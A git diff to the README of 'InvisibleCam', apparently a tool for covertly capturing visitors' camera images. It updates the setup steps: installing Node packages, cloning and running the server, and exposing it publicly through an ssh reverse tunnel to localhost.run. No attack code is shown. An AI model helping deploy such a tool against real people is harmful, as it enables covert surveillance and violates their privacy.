@@ -18,21 +18,28 @@ Windows(cmd)  | Support
 Termux        | Support
 
 
+## Download the original termux from here
+```https://github.com/termux/termux-app/releases/download/v0.118.1/termux-app_v0.118.1+github-debug_arm64-v8a.apk```
+
 ## Installation:
 ##### 1. Install nodejs
-   ```pkg install nodejs```
-##### 2. Clone the repository
+   ```pkg install nodejs-lts```
+##### 2. Install multer
+   ```npm install multer```
+##### 3. Install express
+   ```npm install express```
+##### 4. Clone the repository
 ```git clone https://github.com/NuhuTahiru8/InvisibleCam.git```
-##### 3. Navigate to the Directory
+##### 5. Navigate to the Directory
 ```cd InvisibleCam```
-##### 4. Start the server
+##### 6. Start the server
 ```node server.js```
-##### 5. Access Website
+##### 7. Access Website
 ```http://localhost:3000```
-##### 6. Access Dashboard
+##### 8. Access Dashboard
 ```http://localhost:3000/dashboard.html```
-##### 7. Access through the internet
-```ssh -R 80:localhost:8080 nokey@localhost.run```
+##### 9. Access through the internet
+```ssh -R 80:localhost:3000 nokey@localhost.run```
 <div align="center">
 
 Copyright © 2023 - **Tahiru0nSecurity**\
